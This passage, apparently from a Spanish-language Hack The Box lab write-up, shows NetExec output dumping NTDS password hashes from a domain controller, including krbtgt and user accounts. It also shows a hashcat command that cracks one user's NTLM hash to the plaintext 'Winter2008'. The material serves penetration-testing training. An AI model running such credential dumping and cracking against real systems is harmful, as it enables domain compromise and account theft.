NTDSUTIL    10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e59d1df920b937ba2f344c6447869589:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1876550/.nxc/logs/ILF-DC01_10.129.202.85_2025-10-10_090236.ntds of which 7 were added to the database
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1876550/.nxc/logs/ILF-DC01_10.129.202.85_2025-10-10_090236.ntds | cut -d ':' -f1

```

La Jennifer tiene el siguiente Hash:
```
92fd67fd2f49d0e83744aa82363f021b
```

Que lo crackeo con:

```
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt.gz 
```

Dando como respuesta:
```
92fd67fd2f49d0e83744aa82363f021b:Winter2008
```

Winter2008